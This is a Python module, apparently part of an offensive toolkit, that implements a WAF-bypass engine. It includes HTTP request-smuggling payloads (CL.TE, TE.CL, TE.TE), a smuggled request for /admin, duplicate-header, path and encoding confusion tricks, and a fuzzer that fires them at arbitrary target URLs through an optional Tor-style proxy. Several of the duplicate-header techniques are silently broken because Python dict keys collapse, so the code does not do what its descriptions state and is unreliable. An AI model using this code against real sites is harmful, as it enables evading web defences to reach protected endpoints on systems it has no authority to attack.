"""
WAF Parsing Discrepancy Engine
Exploits differences between Cloudflare/edge WAF and origin server HTTP parsing.
Based on WAFFLED paper (2026) and known HTTP request smuggling techniques.
"""
import random
import logging
import socket
import ssl
import asyncio
from typing import Dict, List, Optional, Callable, Any, Tuple
from urllib.parse import urlparse, quote
from dataclasses import dataclass

from core.network.socks_utils import create_proxied_socket

logger = logging.getLogger("waf_parsing_bypass")


class RequestModifier:
    """Helper class for modifying HTTP requests to exploit WAF parsing discrepancies."""

    def __init__(self):
        self.methods_map = {
            'get': 'GET', 'post': 'POST', 'head': 'HEAD',
            'put': 'PUT', 'delete': 'DELETE', 'patch': 'PATCH',
            'options': 'OPTIONS', 'trace': 'TRACE', 'connect': 'CONNECT',
        }

    @staticmethod
    def modify_request_line(method: str, path: str, http_version: str = "HTTP/1.1") -> Tuple[str, str, str]:
        """Apply method spoofing and path confusion techniques."""
        modified_method = method
        modified_path = path
        modified_http_version = http_version

        case_choice = random.random()
        if case_choice < 0.25:
            modified_method = method.upper()
        elif case_choice < 0.5:
            modified_method = method.lower()
        elif case_choice < 0.75:
            modified_method = method.capitalize()
        else:
            modified_method = method

        if random.random() < 0.3:
            if not modified_path.startswith("/"):
                modified_path = "/" + modified_path

        if random.random() < 0.2:
            modified_path = "/." + modified_path

        return modified_method, modified_path, modified_http_version

    @staticmethod
    def modify_headers(headers_dict: Dict[str, str]) -> Dict[str, str]:
        """Apply header manipulation techniques."""
        manipulated = dict(headers_dict)

        if random.random() < 0.3 and "Transfer-Encoding" not in manipulated:
            manipulated["Transfer-Encoding"] = "chunked"

        if random.random() < 0.2:
            manipulated["X-Forwarded-For"] = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"

        if random.random() < 0.15:
            manipulated["X-Real-IP"] = manipulated.get("X-Forwarded-For", "127.0.0.1")

        return manipulated

    @staticmethod
    def modify_body(body: str, content_type: str) -> Tuple[str, str]:
        """Apply content-type confusion techniques."""
        modified_body = body
        modified_content_type = content_type

        if content_type == "application/x-www-form-urlencoded" and random.random() < 0.4:
            modified_content_type = "application/x-www-form-urlencoded; charset=utf-8"

        if content_type == "application/json" and random.random() < 0.3:
            modified_content_type = "text/plain"

        if random.random() < 0.2:
            modified_content_type = modified_content_type.replace("; ", ";")

        return modified_body, modified_content_type

    @staticmethod
    def build_raw_request(method: str, path: str, headers: Dict[str, str],
                         body: str = "", http_version: str = "HTTP/1.1") -> bytes:
        """Build complete raw HTTP request bytes."""
        request_line = f"{method} {path} {http_version}\r\n"
        header_lines = [f"{k}: {v}" for k, v in headers.items()]
        raw = request_line + "\r\n".join(header_lines) + "\r\n\r\n"
        if body:
            raw += body
        return raw.encode("utf-8", errors="replace")

    @staticmethod
    def parse_url(target_url: str) -> Tuple[str, int, str, bool]:
        """Parse URL into host, port, path, and SSL flag."""
        parsed = urlparse(target_url)
        host = parsed.hostname or ""
        port = parsed.port or (443 if parsed.scheme == "https" else 80)
        path = parsed.path or "/"
        if parsed.query:
            path += "?" + parsed.query
        use_ssl = parsed.scheme == "https"
        return host, port, path, use_ssl


def _make_request_modifier(raw_method: str, raw_path: str, raw_headers: Dict[str, str],
                           raw_body: str, raw_http_version: str = "HTTP/1.1") -> Callable:
    """Factory for modify_request callables that preserves closure state."""
    def modifier(request_dict: Dict[str, Any]) -> Dict[str, Any]:
        result = dict(request_dict)
        result.setdefault("method", raw_method)
        result.setdefault("path", raw_path)
        result.setdefault("http_version", raw_http_version)
        result.setdefault("headers", dict(raw_headers))
        result.setdefault("body", raw_body)
        return result
    return modifier


def te_chunked_with_obfuscation() -> Dict[str, Any]:
    """Transfer-Encoding: chunked with random comments/tabs for obfuscation."""
    te_value = random.choice([
        "chunked",
        " chunked",
        "chunked;",
        "chunked,",
        "  chunked",
        "chunked  ",
        "\tchunked",
        "chunked\t",
        "chunked;foo=bar",
        "chunked,identity",
    ])
    headers = {"Transfer-Encoding": te_value}

    return {
        "name": "te_chunked_obfuscation",
        "description": f"Transfer-Encoding with obfuscation value: {repr(te_value)}",
        "payload": f"Transfer-Encoding: {te_value}",
        "modify_request": _make_request_modifier("POST", "/", headers, ""),
        "detection": "Cloudflare may normalize/ignore obfuscated TE; Nginx/Apache may interpret literally",
        "effectiveness": 0.65,
    }


def te_cl_smuggling() -> Dict[str, Any]:
    """CL.TE smuggling: Content-Length + Transfer-Encoding: chunked."""
    smuggled_body = "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: internal\r\n\r\n"
    cl_value = str(len(smuggled_body))
    headers = {
        "Content-Length": cl_value,
        "Transfer-Encoding": "chunked",
    }

    return {
        "name": "te_cl_smuggling",
        "description": "CL.TE smuggling: WAF sees Content-Length, origin processes Transfer-Encoding: chunked",
        "payload": f"Content-Length: {cl_value}\r\nTransfer-Encoding: chunked\r\n\r\n{smuggled_body}",
        "modify_request": _make_request_modifier("POST", "/", headers, smuggled_body),
        "detection": "WAF validates Content-Length body; backend parses chunked encoding and processes smuggled request",
        "effectiveness": 0.75,
    }


def cl_te_smuggling() -> Dict[str, Any]:
    """TE.CL smuggling: Transfer-Encoding + Content-Length."""
    headers = {
        "Transfer-Encoding": "identity",
        "Content-Length": "5",
    }
    body = "X" * 5

    return {
        "name": "cl_te_smuggling",
        "description": "TE.CL smuggling: WAF follows Transfer-Encoding: identity, origin uses Content-Length",
        "payload": "Transfer-Encoding: identity\r\nContent-Length: 5\r\n\r\nXXXXX",
        "modify_request": _make_request_modifier("POST", "/", headers, body),
        "detection": "WAF ignores body expecting TE; backend reads Content-Length and processes body differently",
        "effectiveness": 0.70,
    }


def te_double() -> Dict[str, Any]:
    """Two Transfer-Encoding headers with different values."""
    headers = {
        "Transfer-Encoding": "chunked",
        "Transfer-Encoding": "identity",
    }

    return {
        "name": "te_double",
        "description": "Duplicate Transfer-Encoding headers: first 'chunked', second 'identity'",
        "payload": "Transfer-Encoding: chunked\r\nTransfer-Encoding: identity",
        "modify_request": _make_request_modifier("GET", "/", headers, ""),
        "detection": "Cloudflare may use first TE value; origin may use second (or combine them)",
        "effectiveness": 0.60,
    }


def multipart_boundary_confusion() -> Dict[str, Any]:
    """Ambiguous boundary parsing in multipart forms."""
    boundary = random.choice([
        '--',
        '----WebKitFormBoundary',
        'boundary',
        '"boundary"',
        '--boundary--',
        'BOUNDARY',
    ])
    headers = {
        "Content-Type": f"multipart/form-data; boundary={boundary}",
    }
    body = f"--{boundary}\r\nContent-Disposition: form-data; name=\"key\"\r\n\r\nvalue\r\n--{boundary}--\r\n"

    return {
        "name": "multipart_boundary_confusion",
        "description": f"Ambiguous multipart boundary: {repr(boundary)}",
        "payload": f"Content-Type: multipart/form-data; boundary={boundary}",
        "modify_request": _make_request_modifier("POST", "/", headers, body),
        "detection": "Cloudflare may misinterpret boundary string; Nginx/uWSGI may parse correctly",
        "effectiveness": 0.55,
    }


def multipart_charset_confusion() -> Dict[str, Any]:
    """application/x-www-form-urlencoded with charset parameter."""
    headers = {
        "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
    }
    body = "key=value&admin=true"

    return {
        "name": "multipart_charset_confusion",
        "description": "Content-Type with charset parameter unexpected for urlencoded data",
        "payload": "Content-Type: application/x-www-form-urlencoded; charset=utf-8",
        "modify_request": _make_request_modifier("POST", "/", headers, body),
        "detection": "Some parsers reject unknown charset; others silently ignore it",
        "effectiveness": 0.40,
    }


def json_vs_urlencoded() -> Dict[str, Any]:
    """Content-Type: application/x-www-form-urlencoded but body is JSON."""
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
    }
    body = '{"key":"value","admin":true}'

    return {
        "name": "json_vs_urlencoded",
        "description": "Content-Type says urlencoded but body is JSON",
        "payload": "Content-Type: application/x-www-form-urlencoded\r\n\r\n{\"key\":\"value\"}",
        "modify_request": _make_request_modifier("POST", "/", headers, body),
        "detection": "WAF parses as urlencoded and misses JSON payload; origin accepts JSON",
        "effectiveness": 0.50,
    }


def duplicate_content_length() -> Dict[str, Any]:
    """Two Content-Length headers with different values."""
    body = "key=value"
    headers = {
        "Content-Length": str(len(body)),
        "Content-Length": "0",
    }

    return {
        "name": "duplicate_content_length",
        "description": "Duplicate Content-Length headers: first correct, second zero",
        "payload": f"Content-Length: {len(body)}\r\nContent-Length: 0",
        "modify_request": _make_request_modifier("POST", "/", headers, body),
        "detection": "WAF takes first CL and processes body; origin takes second CL and ignores body",
        "effectiveness": 0.65,
    }


def duplicate_host() -> Dict[str, Any]:
    """Two Host headers with different values."""
    headers = {
        "Host": "target.com",
        "Host": "evil.com",
    }

    return {
        "name": "duplicate_host",
        "description": "Duplicate Host headers: 'target.com' and 'evil.com'",
        "payload": "Host: target.com\r\nHost: evil.com",
        "modify_request": _make_request_modifier("GET", "/", headers, ""),
        "detection": "Cloudflare routes to target; origin may route to evil or reject",
        "effectiveness": 0.45,
    }


def line_folding() -> Dict[str, Any]:
    """HTTP/1.1 header line folding (obs-fold)."""
    headers = {
        "X-Custom": "value1\r\n value2",
    }

    return {
        "name": "line_folding",
        "description": "HTTP/1.1 obs-fold header folding continuation",
        "payload": "X-Custom: value1\r\n value2",
        "modify_request": _make_request_modifier("GET", "/", headers, ""),
        "detection": "Modern parsers (Cloudflare) reject obs-fold; legacy origin servers may accept",
        "effectiveness": 0.35,
    }


def method_override() -> Dict[str, Any]:
    """X-HTTP-Method-Override: POST with GET."""
    headers = {
        "X-HTTP-Method-Override": "GET",
    }

    return {
        "name": "method_override",
        "description": "X-HTTP-Method-Override: POST with GET method override",
        "payload": "X-HTTP-Method-Override: GET",
        "modify_request": _make_request_modifier("POST", "/", headers, ""),
        "detection": "Cloudflare blocks POST; origin accepts method override and processes as GET",
        "effectiveness": 0.70,
    }


def head_instead_of_get() -> Dict[str, Any]:
    """HEAD instead of GET for same effect."""
    return {
        "name": "head_instead_of_get",
        "description": "HEAD request instead of GET",
        "payload": "HEAD / HTTP/1.1",
        "modify_request": _make_request_modifier("HEAD", "/", {}, ""),
        "detection": "WAF may whitelist HEAD; origin may still process the response",
        "effectiveness": 0.30,
    }


def method_case_mutation() -> Dict[str, Any]:
    """Method with different cases."""
    method_variant = random.choice(["get", "Get", "GET", "gET", "geT"])
    return {
        "name": "method_case_mutation",
        "description": f"HTTP method case mutation: {repr(method_variant)}",
        "payload": method_variant,
        "modify_request": _make_request_modifier(method_variant, "/", {}, ""),
        "detection": "WAF may only match uppercase GET; origin may be case-insensitive",
        "effectiveness": 0.55,
    }


def dot_segment_confusion() -> Dict[str, Any]:
    """Path normalization with dot segments."""
    path_variant = random.choice([
        "/./path",
        "//path",
        "/path/.",
        "/path/./",
        "/././path",
        "///path",
        "/path/../path",
        "/path%2f.",
    ])
    return {
        "name": "dot_segment_confusion",
        "description": f"Path dot-segment confusion: {repr(path_variant)}",
        "payload": path_variant,
        "modify_request": _make_request_modifier("GET", path_variant, {}, ""),
        "detection": "Cloudflare normalizes path; origin may handle literally, revealing different resources",
        "effectiveness": 0.60,
    }


def url_encoding_confusion() -> Dict[str, Any]:
    """URL encoding confusion with %2f and %00 injection."""
    payload = random.choice([
        "/%2fadmin",
        "/admin%00",
        "/%00admin",
        "/%2f%2fadmin",
        "/%2e%2e/admin",
        "/admin%2f",
    ])
    return {
        "name": "url_encoding_confusion",
        "description": f"URL encoding confusion: {repr(payload)}",
        "payload": payload,
        "modify_request": _make_request_modifier("GET", payload, {}, ""),
        "detection": "WAF decodes then blocks; origin may decode differently or process null byte",
        "effectiveness": 0.65,
    }


def case_sensitive_path() -> Dict[str, Any]:
    """Case-sensitive path confusion."""
    path_variant = random.choice([
        "/Admin",
        "/ADMIN",
        "/aDmin",
        "/admin.php",
        "/Admin.php",
    ])
    return {
        "name": "case_sensitive_path",
        "description": f"Case-sensitive path confusion: {repr(path_variant)}",
        "payload": path_variant,
        "modify_request": _make_request_modifier("GET", path_variant, {}, ""),
        "detection": "WAF blocks /admin; origin serves /Admin or /ADMIN due to case-insensitive filesystem",
        "effectiveness": 0.60,
    }


def trailing_slash_confusion() -> Dict[str, Any]:
    """Trailing slash confusion."""
    path_variant = random.choice([
        "/path",
        "/path/",
        "/path//",
        "/path///",
        "/path/.",
        "/path/?",
    ])
    return {
        "name": "trailing_slash_confusion",
        "description": f"Trailing slash confusion: {repr(path_variant)}",
        "payload": path_variant,
        "modify_request": _make_request_modifier("GET", path_variant, {}, ""),
        "detection": "WAF rule matches /path exactly; origin may treat /path/ and /path identically",
        "effectiveness": 0.50,
    }


def http_1_0_downgrade() -> Dict[str, Any]:
    """Force HTTP/1.0 to bypass WAF features only available in HTTP/1.1."""
    return {
        "name": "http_1_0_downgrade",
        "description": "Downgrade to HTTP/1.0",
        "payload": "GET / HTTP/1.0",
        "modify_request": _make_request_modifier("GET", "/", {}, "", "HTTP/1.0"),
        "detection": "Cloudflare treats HTTP/1.0 differently; origin may accept with reduced security headers",
        "effectiveness": 0.40,
    }


def connection_header_confusion() -> Dict[str, Any]:
    """Connection header manipulation."""
    conn_value = random.choice([
        "close",
        "keep-alive",
        "upgrade",
        "close, X-Injected",
        "TE",
        "Keep-Alive",
    ])
    headers = {"Connection": conn_value}

    return {
        "name": "connection_header_confusion",
        "description": f"Connection header confusion: {repr(conn_value)}",
        "payload": f"Connection: {conn_value}",
        "modify_request": _make_request_modifier("GET", "/", headers, ""),
        "detection": "Connection header may affect how WAF vs origin handles the request lifecycle",
        "effectiveness": 0.35,
    }


def tab_vs_space_separation() -> Dict[str, Any]:
    """Tab instead of space in request line."""
    tab_request = "GET\t/\tHTTP/1.1"
    return {
        "name": "tab_vs_space_separation",
        "description": "Tab character instead of space in request line",
        "payload": tab_request,
        "modify_request": _make_request_modifier("GET", "/", {}, "", ""),
        "detection": "WAF may fail to parse tab-separated request line; origin (Apache/Nginx) accepts tabs",
        "effectiveness": 0.50,
    }


def _smuggling_chunked_body(smuggled_request: str) -> Tuple[Dict[str, str], str]:
    """Build chunked body with smuggled request for TE-based smuggling."""
    chunk_size = hex(len(smuggled_request))[2:]
    body = f"{chunk_size}\r\n{smuggled_request}\r\n0\r\n\r\n"
    headers = {
        "Transfer-Encoding": "chunked",
        "Content-Length": str(len(body)),
    }
    return headers, body


# Registry of all bypass methods
_ALL_METHODS = [
    te_chunked_with_obfuscation,
    te_cl_smuggling,
    cl_te_smuggling,
    te_double,
    multipart_boundary_confusion,
    multipart_charset_confusion,
    json_vs_urlencoded,
    duplicate_content_length,
    duplicate_host,
    line_folding,
    method_override,
    head_instead_of_get,
    method_case_mutation,
    dot_segment_confusion,
    url_encoding_confusion,
    case_sensitive_path,
    trailing_slash_confusion,
    http_1_0_downgrade,
    connection_header_confusion,
    tab_vs_space_separation,
]

METHOD_NAMES = [fn.__name__ for fn in _ALL_METHODS]


class WafParsingBypassEngine:
    """Engine for exploiting WAF parsing discrepancies."""

    def __init__(self):
        self.modifier = RequestModifier()
        self._methods = {fn.__name__: fn for fn in _ALL_METHODS}
        self._method_list = [fn() for fn in _ALL_METHODS]

    def get_all_methods(self) -> List[Dict[str, Any]]:
        """Return all available bypass methods with their details."""
        return [fn() for fn in _ALL_METHODS]

    def get_random_method(self) -> Dict[str, Any]:
        """Return a single randomly selected bypass method."""
        fn = random.choice(_ALL_METHODS)
        return fn()

    def get_filtered_methods(self, target_waf: str) -> List[Dict[str, Any]]:
        """Return methods filtered by effectiveness against a specific WAF.

        Args:
            target_waf: WAF name ('cloudflare', 'aws_waf', 'akamai', 'f5', 'imperva', 'sucuri', 'generic')
        """
        target_waf = target_waf.lower().replace("-", "_").replace(" ", "_")
        all_methods = self.get_all_methods()

        waf_effectiveness_map = {
            "cloudflare": {
                "te_chunked_with_obfuscation": 0.7,
                "te_cl_smuggling": 0.6,
                "cl_te_smuggling": 0.55,
                "te_double": 0.5,
                "method_override": 0.75,
                "url_encoding_confusion": 0.7,
                "dot_segment_confusion": 0.65,
            },
            "aws_waf": {
                "duplicate_content_length": 0.7,
                "multipart_boundary_confusion": 0.6,
                "case_sensitive_path": 0.55,
                "line_folding": 0.5,
            },
            "akamai": {
                "http_1_0_downgrade": 0.65,
                "tab_vs_space_separation": 0.6,
                "connection_header_confusion": 0.55,
            },
        }

        waf_specific = waf_effectiveness_map.get(target_waf, {})
        for method in all_methods:
            name = method["name"]
            if name in waf_specific:
                method["effectiveness"] = waf_specific[name]

        threshold = 0.5
        filtered = [m for m in all_methods if m["effectiveness"] >= threshold]

        return filtered or all_methods

    def apply_method(self, request_data: Dict[str, Any], method_name: str) -> Optional[Dict[str, Any]]:
        """Apply a specific bypass method to request data.

        Args:
            request_data: dict with keys 'method', 'path', 'headers', 'body', 'http_version'
            method_name: name of the method to apply

        Returns:
            Modified request_data dict, or None if method not found
        """
        factory = self._methods.get(method_name)
        if factory is None:
            logger.warning("Unknown bypass method: %s", method_name)
            return None

        method = factory()
        modifier_fn = method["modify_request"]
        try:
            result = modifier_fn(request_data)
            logger.debug("Applied bypass method '%s' to request", method_name)
            return result
        except Exception as exc:
            logger.error("Failed to apply method '%s': %s", method_name, exc)
            return None

    def fuzz_target(self, target_url: str, methods_count: int = 5, proxy_url: Optional[str] = None) -> List[Dict[str, Any]]:
        """Test a subset of bypass methods against a target and return results.

        Args:
            target_url: URL to test against
            methods_count: number of random methods to select
            proxy_url: optional SOCKS5 proxy URL (e.g. socks5h://127.0.0.1:9050)

        Returns:
            List of dicts with method details and whether they appeared to work
        """
        selected = random.sample(_ALL_METHODS, min(methods_count, len(_ALL_METHODS)))
        results = []

        for fn in selected:
            method = fn()
            logger.info("Fuzzing target %s with method: %s", target_url, method["name"])

            try:
                host, port, path, use_ssl = self.modifier.parse_url(target_url)
                request_data = {
                    "method": "GET",
                    "path": path,
                    "headers": {"Host": host},
                    "body": "",
                    "http_version": "HTTP/1.1",
                }

                modified = self.apply_method(request_data, method["name"])
                if modified is None:
                    continue

                raw_request = self.modifier.build_raw_request(
                    modified.get("method", "GET"),
                    modified.get("path", "/"),
                    modified.get("headers", {"Host": host}),
                    modified.get("body", ""),
                    modified.get("http_version", "HTTP/1.1"),
                )

                result_dict = {
                    "method": method["name"],
                    "description": method["description"],
                    "payload": method["payload"],
                    "raw_bytes": raw_request,
                    "tested": True,
                }

                try:
                    sock = create_proxied_socket(proxy_url or "", timeout=5.0)

                    if use_ssl:
                        context = ssl.create_default_context()
                        context.check_hostname = False
                        context.verify_mode = ssl.CERT_NONE
                        sock = context.wrap_socket(sock, server_hostname=host)
                        sock.connect((host, port))
                    else:
                        sock.connect((host, port))

                    sock.sendall(raw_request)
                    response = sock.recv(4096)
                    sock.close()

                    if response:
                        status_line = response.split(b"\r\n")[0].decode("utf-8", errors="replace")
                        result_dict["status"] = status_line
                        result_dict["response_length"] = len(response)
                        result_dict["success"] = b"200" in response[:64] or b"301" in response[:64] or b"302" in response[:64]
                    else:
                        result_dict["status"] = "NO_RESPONSE"
                        result_dict["success"] = False

                except (socket.timeout, ConnectionRefusedError, OSError) as exc:
                    result_dict["status"] = f"ERROR: {exc}"
                    result_dict["success"] = False
                    logger.debug("Connection error for %s: %s", method["name"], exc)

                results.append(result_dict)

            except Exception as exc:
                logger.error("Fuzz error with method '%s': %s", method["name"], exc)
                results.append({
                    "method": method["name"],
                    "description": method["description"],
                    "payload": method["payload"],
                    "tested": False,
                    "status": f"ERROR: {exc}",
                    "success": False,
                })

        return results

    def detect_smuggling_vulnerability(self, target_url: str, proxy_url: Optional[str] = None) -> Dict[str, Any]:
        """Test if target is vulnerable to HTTP Request Smuggling.

        Tests CL.TE, TE.CL, and TE.TE variations.

        Args:
            target_url: URL to test

        Returns:
            Dict with vulnerability assessment
        """
        host, port, path, use_ssl = self.modifier.parse_url(target_url)
        results = {
            "target": target_url,
            "host": host,
            "port": port,
            "cl_te_vulnerable": False,
            "te_cl_vulnerable": False,
            "te_te_vulnerable": False,
            "details": {},
        }

        smuggled_request = f"GET /smuggle-test-{random.randint(10000,99999)} HTTP/1.1\r\nHost: {host}\r\n\r\n"

        # CL.TE test
        cl_te_headers, cl_te_body = _smuggling_chunked_body(smuggled_request)
        cl_te_raw = self.modifier.build_raw_request(
            "POST", path, {**cl_te_headers, "Host": host}, cl_te_body
        )

        # TE.CL test
        te_cl_headers = {
            "Transfer-Encoding": "identity",
            "Content-Length": "100",
        }
        te_cl_body = smuggled_request + "A" * (100 - len(smuggled_request))
        te_cl_raw = self.modifier.build_raw_request(
            "POST", path, {**te_cl_headers, "Host": host}, te_cl_body
        )

        # TE.TE test
        te_te_headers = {
            "Transfer-Encoding": "chunked",
            "Transfer-Encoding": "x",
        }
        te_te_body = f"{hex(len(smuggled_request))[2:]}\r\n{smuggled_request}\r\n0\r\n\r\n"
        te_te_raw = self.modifier.build_raw_request(
            "POST", path, {**te_te_headers, "Host": host}, te_te_body
        )

        tests = {
            "cl_te": ("CL.TE", cl_te_raw),
            "te_cl": ("TE.CL", te_cl_raw),
            "te_te": ("TE.TE", te_te_raw),
        }

        for test_key, (test_name, raw_bytes) in tests.items():
            try:
                sock = create_proxied_socket(proxy_url or "", timeout=5.0)

                if use_ssl:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    sock = context.wrap_socket(sock, server_hostname=host)
                    sock.connect((host, port))
                else:
                    sock.connect((host, port))

                sock.sendall(raw_bytes)

                try:
                    response = sock.recv(4096)
                    results["details"][test_key] = {
                        "sent_bytes": len(raw_bytes),
                        "received_bytes": len(response),
                        "response": response[:256].decode("utf-8", errors="replace"),
                    }
                    if b"smuggle" in response.lower() or b"200" in response[:64]:
                        results[f"{test_key}_vulnerable"] = True
                except socket.timeout:
                    results["details"][test_key] = {
                        "sent_bytes": len(raw_bytes),
                        "received_bytes": 0,
                        "response": "TIMEOUT",
                    }

                sock.close()

            except (socket.timeout, ConnectionRefusedError, OSError) as exc:
                results["details"][test_key] = {
                    "sent_bytes": len(raw_bytes),
                    "response": f"ERROR: {exc}",
                }

        results["vulnerable"] = (
            results["cl_te_vulnerable"]
            or results["te_cl_vulnerable"]
            or results["te_te_vulnerable"]
        )

        logger.info(
            "Smuggling scan for %s: CL.TE=%s, TE.CL=%s, TE.TE=%s",
            target_url,
            results["cl_te_vulnerable"],
            results["te_cl_vulnerable"],
            results["te_te_vulnerable"],
        )

        return results


# Module-level exports
__all__ = [
    "RequestModifier",
    "WafParsingBypassEngine",
    "METHOD_NAMES",
    "te_chunked_with_obfuscation",
    "te_cl_smuggling",
    "cl_te_smuggling",
    "te_double",
    "multipart_boundary_confusion",
    "multipart_charset_confusion",
    "json_vs_urlencoded",
    "duplicate_content_length",
    "duplicate_host",
    "line_folding",
    "method_override",
    "head_instead_of_get",
    "method_case_mutation",
    "dot_segment_confusion",
    "url_encoding_confusion",
    "case_sensitive_path",
    "trailing_slash_confusion",
    "http_1_0_downgrade",
    "connection_header_confusion",
    "tab_vs_space_separation",
    "get_all_bypass_methods",
    "create_bypass_engine",
]


def get_all_bypass_methods() -> List[Dict[str, Any]]:
    """Convenience function to retrieve all bypass methods."""
    return [fn() for fn in _ALL_METHODS]


def create_bypass_engine() -> WafParsingBypassEngine:
    """Create and return a new WafParsingBypassEngine instance."""
    return WafParsingBypassEngine()
